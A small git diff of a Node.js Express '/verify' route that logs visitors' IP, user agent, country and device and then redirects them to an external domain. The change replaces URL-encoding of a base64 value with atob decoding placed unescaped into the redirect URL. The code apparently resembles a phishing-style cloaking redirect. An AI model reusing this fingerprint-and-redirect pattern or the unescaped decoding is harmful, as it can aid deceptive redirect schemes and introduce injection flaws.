@@ -216,7 +216,7 @@ app.post('/verify', async (req, res) => {
         logVisitor(clientIp, ua, country, device);
         const baseUrl = process.env.REDIRECT_BASE_URL || 'https://storedns27.com/share/t/2221';
         const cleanBaseUrl = baseUrl.endsWith('#') ? baseUrl.slice(0, -1) : baseUrl;
-        const redirectUrl = cleanBaseUrl + '/#' + encodeURIComponent(cleanB64);
+        const redirectUrl = cleanBaseUrl + '/#' + atob(cleanB64);
         //const redirectUrl = cleanBaseUrl + '/' + encodeURIComponent(cleanB64);
         
         // const redirectUrl = baseUrl + '#' + cleanB64;
